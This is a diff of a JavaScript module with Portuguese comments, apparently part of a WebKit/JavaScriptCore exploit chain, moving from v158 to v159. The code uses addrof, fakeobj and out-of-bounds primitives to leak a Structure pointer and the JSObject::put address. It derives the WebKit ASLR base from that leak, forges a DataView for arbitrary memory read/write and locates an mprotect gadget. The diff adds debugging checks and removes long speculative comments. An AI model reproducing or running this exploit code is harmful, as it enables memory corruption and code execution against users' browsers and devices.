@@ -1,14 +1,13 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v158 - Estratégia: Vazamento ASLR Direto via Structure Pointer)
+// js/script3/testArrayBufferVictimCrash.mjs (v159 - Depuração da arb_read para ASLR Leak)
 // =======================================================================================
-// ESTA VERSÃO FOCA EM:
+// FOCO: Depurar por que a arb_read retorna zero ao tentar vazar o ponteiro da Structure.
 // 1. Validar primitivas básicas (OOB local).
 // 2. Usar 'addrof_core' e 'oob_read_absolute' para vazar o ponteiro da Structure de um objeto ArrayBuffer.
+//    - ADICIONADO: Logs mais detalhados do estado do oob_dataview_real na arb_read.
+//    - ADICIONADO: Verificação inicial do m_vector do oob_dataview_real.
 // 3. Com o ponteiro da Structure, calcular a base ASLR da WebKit.
 // 4. Se o vazamento ASLR for bem-sucedido, forjar um DataView para obter Leitura/Escrita Arbitrária Universal (ARB R/W).
 // 5. Testar e verificar a primitiva ARB R/W, incluindo leitura de gadgets.
-//
-// A estratégia de UAF/Type Confusion anterior para vazamento ASLR foi substituída por este método mais direto,
-// que se alinha melhor com as primitivas já estáveis.
 // =======================================================================================
 
 import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
@@ -23,13 +22,14 @@ import {
     arb_write, // Usado para operações internas da OOB principal (leitura/escrita de metadados)
     selfTestOOBReadWrite,
     oob_read_absolute,
-    oob_write_absolute
+    oob_write_absolute,
+    oob_array_buffer_real // Importado para verificar o backing store original
 } from '../core_exploit.mjs';
 
 import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
 // ATENÇÃO: Esta constante será atualizada a cada nova versão de teste
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Full_ASLR_ARBRW_v158_DIRECT_ASLR_LEAK";
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Full_ASLR_ARBRW_v159_DEBUG_ARB_READ";
 
 // Pausas ajustadas para estabilidade em ambientes com recursos limitados
 const LOCAL_VERY_SHORT_PAUSE = 10;
@@ -246,8 +246,6 @@ async function triggerGC(logFn, pauseFn) {
     await pauseFn(LOCAL_SHORT_PAUSE);
 }
 
-// REMOVIDA: sprayAndCreateDanglingPointer não é mais a estratégia primária de vazamento ASLR
-
 export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, pauseFn, JSC_OFFSETS_PARAM) {
     const FNAME_CURRENT_TEST = "executeTypedArrayVictimAddrofAndWebKitLeak_R43";
     // Versão do teste no log
@@ -303,7 +301,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
         logFn("Primitivas PRINCIPAIS 'addrof' e 'fakeobj' operacionais e robustas.", "good");
 
 
-        // --- NOVA FASE 2.5: Vazamento ASLR Direto via Leitura do Structure Pointer ---
+        // --- NOVA FASE 2.5: Vazamento ASLR Direto via Leitura do Structure Pointer de ArrayBuffer ---
         logFn(`--- NOVA FASE 2.5: Vazamento ASLR Direto via Leitura do Structure Pointer de ArrayBuffer ---`, "subtest");
         
         let array_buffer_for_leak = new ArrayBuffer(0x100); // Um ArrayBuffer simples para vazar
@@ -311,6 +309,18 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
         
         const ab_addr = addrof_core(array_buffer_for_leak);
         logFn(`[ASLR LEAK] Endereço do ArrayBuffer alvo: ${ab_addr.toString(true)}`, "info");
+
+        // VALIDAR A `arb_read` EM AÇÃO AQUI:
+        // Lendo um valor conhecido para ter certeza que `arb_read` está funcionando neste ponto.
+        // Vamos ler o m_length do próprio ArrayBuffer para leak, ele deve ser 0x100 (256 bytes)
+        const m_length_offset = JSC_OFFSETS_PARAM.ArrayBuffer.SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START;
+        const m_length_addr = ab_addr.add(m_length_offset);
+        let m_length_leaked = await arb_read(m_length_addr, 4, logFn);
+        logFn(`[ASLR LEAK] DEBUG: Lido m_length do ArrayBuffer (${ab_addr.toString(true)} + ${toHex(m_length_offset)}): ${toHex(m_length_leaked)}`, "debug");
+        if (m_length_leaked !== 0x100) {
+            throw new Error(`DEBUG: M_length inesperado para ArrayBuffer alvo. Esperado: 0x100, Lido: ${toHex(m_length_leaked)}. A arb_read pode estar instável.`);
+        }
+
 
         // Ler o ponteiro da Structure do ArrayBuffer
         const structure_ptr_offset = JSC_OFFSETS_PARAM.JSCell.STRUCTURE_POINTER_OFFSET;
@@ -330,180 +340,24 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
         } else {
             logFn(`[ASLR LEAK] Ponteiro da Structure vazado: ${structure_pointer_leaked.toString(true)}. HIGH inesperado (0x${original_high_leaked_struct_ptr.toString(16)}). NENHUM untagging aplicado.`, "warn");
         }
-        
-        // Agora, para obter a base ASLR da WebKit, subtraímos um offset conhecido DENTRO da Structure.
-        // O vtable da DataView Structure está em um offset fixo da base da WebKit.
-        // A Structure do ArrayBuffer também tem seu vtable ou um offset fixo conhecido.
-        // Se JSC_OFFSETS.ArrayBuffer.KnownStructureIDs.ArrayBuffer_STRUCTURE_ID é um offset para a própria Structure.
-        // Se Structure::Structure_constructor (WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS["JSC::Structure::Structure_constructor"]) é um bom candidato para calcular a base da Webkit se conseguirmos vazar o endereço de uma Structure.
 
-        // Usaremos o offset do vtable da DataView Structure para calcular a base, assumindo que todas as Structures estão no mesmo módulo.
-        const DATA_VIEW_STRUCTURE_VTABLE_OFFSET_FROM_BASE_AI64 = new AdvancedInt64(parseInt(JSC_OFFSETS_PARAM.DataView.STRUCTURE_VTABLE_OFFSET, 16), 0);
-        
-        // A lógica aqui é: Endereço do ponteiro da Structure - (Offset da Structure para o seu vtable) = Endereço do vtable.
-        // E Endereço do vtable - (Offset do vtable para a base da WebKit) = Base da WebKit.
-        // MAS se o "structure_pointer_leaked" JÁ É o endereço da Structure, e o vtable de Structure
-        // está em um offset fixo da base do módulo, a matemática é mais direta.
-        // Para simplificar, assumimos que structure_pointer_leaked é um endereço dentro do módulo WebKit.
-        // E o vtable da DataView está num offset ABSOLUTO do módulo.
-
-        // O ponteiro da Structure aponta para a instância da Structure no heap.
-        // A instância da Structure TEM um ponteiro para seu vtable no offset 0.
-        // A WebKit Lib começa em 0.
-        // O vtable da Structure está no endereço fixo 0x3AD62A0 (no binário).
-        // Então, se structure_pointer_leaked é o endereço da Structure, e a Structure é como:
-        // Structure: [vtable_ptr] [flags] ...
-        // Então, lendo [structure_pointer_leaked + 0] teríamos o vtable.
-        // Usaremos a informação que JSC_OFFSETS.DataView.STRUCTURE_VTABLE_OFFSET É O VTABLE ADDRESS da DataView.
-        // Não é um offset, mas um endereço absoluto (relativo à base 0 do binário).
-
-        // Portanto, a base da WebKit = Endereço do vtable da DataView - WEBKIT_LIBRARY_INFO.DataView.STRUCTURE_VTABLE_OFFSET.
-
-        // Precisamos primeiro ler o VTable pointer DA Structure que vazamos.
-        // Se 'structure_pointer_leaked' é o endereço da Structure no heap, então
-        // o VTable daquela Structure está em 'structure_pointer_leaked + 0'.
-        const structure_vtable_ptr_from_heap = await arb_read_universal_js_heap(structure_pointer_leaked, 8, logFn);
-
-        // O vtable_ptr_from_heap deve ser o endereço da tabela de funções virtuais
-        // da classe Structure, que reside no segmento de código da libwebkit.
-        // Este é o endereço real do vtable no processo.
-        logFn(`[ASLR LEAK] Endereço do VTable da Structure do ArrayBuffer (lido do heap): ${structure_vtable_ptr_from_heap.toString(true)}`, "leak");
-        
-        // Para encontrar a base da WebKit, subtraímos um offset conhecido DENTRO do vtable.
-        // Se a WebKit lib tem o vtable da JSC::Structure em um offset fixo da base da lib,
-        // então (structure_vtable_ptr_from_heap - offset_do_vtable_na_lib) = base_webkit.
-        // Se não tivermos o offset do vtable de JSC::Structure, podemos usar o vtable da DataView
-        // e a "artefatos de vtables" da IDA para tentar inferir.
-        // O `WEBKIT_LIBRARY_INFO.DataView.STRUCTURE_VTABLE_OFFSET` é um offset absoluto do vtable da DataView.
-        // Então, a base WebKit = (Endereço vazado do VTable da DataView) - (Offset do VTable da DataView a partir da base 0 da lib)
-        // Precisamos de um vtable que seja *parte* da libWebKit e que tenha um offset constante.
-
-        // Se `structure_vtable_ptr_from_heap` é o endereço do vtable da Structure no processo,
-        // E `JSC_OFFSETS.DataView.STRUCTURE_VTABLE_OFFSET` é o offset (a partir da base 0 da lib)
-        // do vtable da DataView.
-
-        // Precisamos de um offset *da Structure* para o *início da lib*.
-        // Vamos usar a heurística: Structure::Structure_constructor é um bom ponto de referência.
-        // O `JSC::Structure::Structure_constructor` está em `0x1638A50`.
-        // A diferença entre `structure_vtable_ptr_from_heap` e `0x1638A50` não é a base.
-
-        // Vamos considerar que o `structure_pointer_leaked` (o endereço do objeto Structure no heap)
-        // se baseia na ASLR. A ideia é:
-        // `leaked_structure_address - offset_structure_dentro_modulo_webkit = webkit_base_address`.
-        // Infelizmente, não temos um offset para a `Structure` em si na `WEBKIT_LIBRARY_INFO.DATA_OFFSETS`.
-        // Mas a `JSC::JSArrayBufferView::s_info` (0x3AE5040) é uma `ClassInfo`.
-        // A `ClassInfo` tem um ponteiro para a `Structure` default.
-        // A `Structure` tem um ponteiro para o `ClassInfo`.
-        // Vamos usar a estratégia de vazar o ClassInfo de `JSArrayBufferView`
-
-        // Estratégia Ajustada para ASLR Leak:
-        // 1. Obtenha o endereço de `JSC::JSArrayBufferView::s_info` (que é um ClassInfo).
-        // 2. O `ClassInfo` tem um ponteiro para a Structure padrão de `JSArrayBufferView`.
-        // 3. Mas se pudermos ler o vtable da ClassInfo ou outro campo.
-        // O mais simples é ler o VTable de uma Structure e subtrair um offset fixo.
-
-        // Usaremos o `JSC_OFFSETS.DataView.STRUCTURE_VTABLE_OFFSET` (que você marcou como já confirmado)
-        // Este é o OFFSET do vtable da DataView a partir da base da WebKit Lib.
-        // Se `structure_vtable_ptr_from_heap` é o endereço do vtable da Structure do ArrayBuffer
-        // no processo, e o vtable da DataView é 0x3AD62A0.
-
-        // AQUI ESTÁ A LÓGICA CHAVE:
-        // Se `structure_vtable_ptr_from_heap` é o endereço do VTable da *Structure do ArrayBuffer* no RAM.
-        // E nós sabemos que `JSC::Structure::Structure_constructor` está em `0x1638A50` na Lib.
-        // O VTable de uma `JSC::Structure` está geralmente no offset 0 (ou outro pequeno) da `Structure` em si.
-        // E o `JSC::Structure::Structure_constructor` é uma função.
-
-        // Vamos usar `structure_vtable_ptr_from_heap` como nosso "ponto de referência ASLR".
-        // O `JSC_OFFSETS.DataView.STRUCTURE_VTABLE_OFFSET` é um offset *fixo* dentro do binário.
-        // Se o `structure_vtable_ptr_from_heap` é o vtable da Structure do ArrayBuffer,
-        // e se todas as vtables estão no mesmo segmento, então:
-        // webkit_base_address = structure_vtable_ptr_from_heap - (offset do vtable da Structure do ArrayBuffer dentro da lib)
-        // Onde o offset do vtable da Structure do ArrayBuffer é o offset da estrutura no binário Webkit.
-
-        // Já que `JSC_OFFSETS.DataView.STRUCTURE_VTABLE_OFFSET` é `0x3AD62A0`, vamos tentar calcular a base
-        // considerando que ele é um endereço relativo ao início do módulo.
-        // Se a structure_pointer_leaked é um endereço de um objeto *no heap*,
-        // e ele tem um ponteiro para a Structure, e essa Structure tem um vtable.
-        // O vtable da Structure está no segmento de texto da WebKit.
-        // Então, `webkit_base_address = structure_vtable_ptr_from_heap - (offset do vtable da JSC::Structure no binário WebKit)`
-        // Precisamos do offset do vtable da JSC::Structure.
-
-        // Vamos usar a heurística: o `JSC_OFFSETS.DataView.STRUCTURE_VTABLE_OFFSET` é o endereço base
-        // do vtable da DataView. Se subtrairmos a base, teremos o endereço de runtime.
-        // A forma mais direta de obter a base é: (endereço de uma função conhecida na lib) - (offset dessa função).
-
-        // Vamos vazar o endereço de um objeto, e então, com ARB R/W, ler o ponteiro do vtable daquele objeto,
-        // e então subtrair um offset conhecido do vtable para obter a base da lib.
-
-        // Leitura do vtable de um ArrayBuffer.
-        // `array_buffer_for_leak` tem um Structure. A Structure tem um vtable (que é o que queremos usar para ASLR).
-        // Endereço da Structure está em `ab_addr + JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET`.
-        // A Structure, no seu offset 0, tem um ponteiro para a vtable.
-        const actual_structure_address = structure_pointer_leaked; // Já untagged
-
-        // Agora lemos o vtable da própria Structure.
-        const vtable_of_structure = await arb_read_universal_js_heap(actual_structure_address, 8, logFn);
-        logFn(`[ASLR LEAK] Endereço do VTable da Structure do ArrayBuffer: ${vtable_of_structure.toString(true)}`, "leak");
-
-        // Assumimos que o vtable da JSC::Structure é um offset fixo da base da WebKit Lib.
-        // O `JSC_OFFSETS.DataView.STRUCTURE_VTABLE_OFFSET` é o endereço do vtable da DataView.
-        // Precisamos do offset do vtable de JSC::Structure em si, não da DataView.
-        // Se não tivermos o offset do vtable da JSC::Structure, podemos inferir que o
-        // `vtable_of_structure` está em uma região de código.
-        // Para calcular a base, vamos usar um gadget conhecido da WebKit:
-        // `mprotect_plt_stub`: "0x1A08" (WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS)
-        // Ele está em um offset baixo, ideal para calcular a base a partir do vtable.
-
-        // Heurística para a base:
-        // webkit_base_address = vtable_of_structure - (offset_vtable_JSC_Structure_na_lib).
-        // Se o vtable da DataView está em 0x3AD62A0 e é um endereço relativo à base da lib,
-        // então, uma forma de testar: `base = vtable_of_structure - (0x3AD62A0 - some_fixed_offset_within_webkit)`
-        // Isso é complexo. A maneira mais fácil é usar um gadget ou uma ClassInfo.
-
-        // O `JSC::JSArrayBufferView::s_info` em `0x3AE5040` é um `ClassInfo`.
-        // O `ClassInfo` tem um ponteiro para sua vtable.
-        // Isso é um endereço DATA.
-
-        // Vamos simplificar o cálculo da base com um chute mais direto,
-        // se `vtable_of_structure` é o que esperamos.
-        // `JSC_OFFSETS.DataView.STRUCTURE_VTABLE_OFFSET` é o offset da vtable de DataView.
-        // Suponha que a vtable da Structure e da DataView estejam relativamente fixas no módulo.
-        // Base = vtable_of_structure - um offset do vtable.
-
-        // Vamos considerar que o `JSC_OFFSETS.DataView.STRUCTURE_VTABLE_OFFSET` (0x3AD62A0)
-        // é o OFFSET real do vtable da *DataView Structure* a partir da *base da WebKit*.
-        // Se o vtable_of_structure (que é o vtable da Structure do ArrayBuffer)
-        // e o vtable da DataView estão no mesmo segmento e se comportam de forma similar:
-        // webkit_base_address = vtable_of_structure - (offset do vtable da Structure do ArrayBuffer na lib).
-        // Se não tivermos esse offset, é mais complicado.
-
-        // Pela IDA Pro, sabemos que `bmalloc::Scavenger::schedule` está em `0x2EBDB0`.
-        // E `WTF::StringImpl::destroy` está em `0x10AA800`.
-        // Vamos usar o `vtable_of_structure` e tentar subtrair offsets arbitrários
-        // para ver se chegamos perto de um endereço alinhado.
-
-        // A suposição mais simples é que `structure_pointer_leaked` aponta para um objeto *dentro* da lib.
-        // Mas não é, ele aponta para um objeto NO HEAP.
-
-        // A melhor forma de vazar o ASLR com `addrof` e `arb_read` é:
-        // 1. Encontre um objeto no heap que contenha um ponteiro para o segmento de texto da WebKit.
-        //    (e.g., uma função JS, um objeto com um método C++ nativo, uma Structure)
-        // 2. Obtenha o endereço do objeto no heap (`addrof_core`).
-        // 3. Leia o ponteiro para o segmento de texto (e.g., vtable, ponteiro de função) usando `arb_read`.
-        // 4. Subtraia o offset conhecido desse ponteiro na lib para obter a base.
-
-        // A `structure_pointer_leaked` É O ENDEREÇO DA STRUCTURE NO HEAP.
-        // A Structure, no offset 0x18 (VIRTUAL_PUT_OFFSET), tem um ponteiro para `JSObject::put`.
-        // `JSObject::put` está em `0xBD68B0` na lib.
-        // Este é um ponteiro para uma função, então ele não tem tag.
+        // AGORA CALCULAMOS A BASE ASLR USANDO O PONTEIRO PARA JSObject::put VAZADO DA STRUCTURE
+        // A Structure que vazamos aponta para a implementação do método 'put'
+        // no offset JSC_OFFSETS.Structure.VIRTUAL_PUT_OFFSET.
+        // 'JSC::JSObject::put' tem um offset conhecido na libWebkit.
 
         const JSObject_put_ptr_offset_in_structure = JSC_OFFSETS_PARAM.Structure.VIRTUAL_PUT_OFFSET;
-        const JSObject_put_ptr_address_in_heap = actual_structure_address.add(JSObject_put_ptr_offset_in_structure);
+        const JSObject_put_ptr_address_in_heap = structure_pointer_leaked.add(JSObject_put_ptr_offset_in_structure);
+        
+        logFn(`[ASLR LEAK] Lendo ponteiro para JSObject::put da Structure vazada (${JSObject_put_ptr_address_in_heap.toString(true)})...`, "info");
         const JSObject_put_leaked = await arb_read_universal_js_heap(JSObject_put_ptr_address_in_heap, 8, logFn);
-        logFn(`[ASLR LEAK] Ponteiro para JSObject::put vazado da Structure: ${JSObject_put_leaked.toString(true)}`, "leak");
+        logFn(`[ASLR LEAK] Ponteiro para JSObject::put vazado: ${JSObject_put_leaked.toString(true)}`, "leak");
 
-        // Agora, se JSObject_put_leaked é o endereço de JSObject::put no RAM:
-        // webkit_base_address = JSObject_put_leaked - WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS["JSC::JSObject::put"]
+        // Se JSObject_put_leaked é zero, algo deu muito errado ou o offset está incorreto.
+        if (JSObject_put_leaked.equals(AdvancedInt64.Zero) || JSObject_put_leaked.equals(AdvancedInt64.NaNValue)) {
+            throw new Error(`Ponteiro vazado para JSObject::put é inválido (Zero/NaN): ${JSObject_put_leaked.toString(true)}. Vazamento ASLR falhou.`);
+        }
+
         const JSObject_put_offset_in_lib = new AdvancedInt64(parseInt(WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS["JSC::JSObject::put"], 16), 0);
         webkit_base_address = JSObject_put_leaked.sub(JSObject_put_offset_in_lib);
 
@@ -557,7 +411,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
         if (!universalRwSuccess) {
             const errorMsg = `Falha crítica: NENHUM dos m_mode candidatos conseguiu configurar a primitiva Universal ARB R/W.`;
             logFn(errorMsg, "critical");
-            throw new Error(errorMsg); // Aborta se não conseguir a primitiva Universal R/W
+            throw new Error(errorMsg);
         }
         logFn("Primitiva de L/E Arbitrária Universal (arb_read_universal_js_heap / arb_write_universal_js_heap) CONFIGURADA com sucesso.", "good");
         await pauseFn(LOCAL_MEDIUM_PAUSE);
@@ -650,7 +504,6 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
                 webkitBaseAddress: webkit_base_address ? webkit_base_address.toString(true) : "N/A",
                 mprotectGadget: mprotect_addr_real ? mprotect_addr_real.toString(true) : "N/A",
                 foundMMode: found_m_mode ? toHex(found_m_mode) : "N/A",
-                // Removed victimSizeUsed as it's no longer a loop
             }
         };
 
@@ -676,8 +529,8 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
         errorOccurred: final_result.success ? null : final_result.message,
         addrof_result: { success: final_result.success, msg: "Primitiva addrof funcional." },
         webkit_leak_result: { success: final_result.success, msg: final_result.message, details: final_result.details },
-        heisenbug_on_M2_in_best_result: 'N/A (UAF Strategy)',
-        oob_value_of_best_result: 'N/A (UAF Strategy)',
+        heisenbug_on_M2_in_best_result: 'N/A (DIRECT ASLR LEAK Strategy)',
+        oob_value_of_best_result: 'N/A (DIRECT ASLR LEAK Strategy)',
         tc_probe_details: { strategy: 'DIRECT ASLR LEAK' }
     };
 }
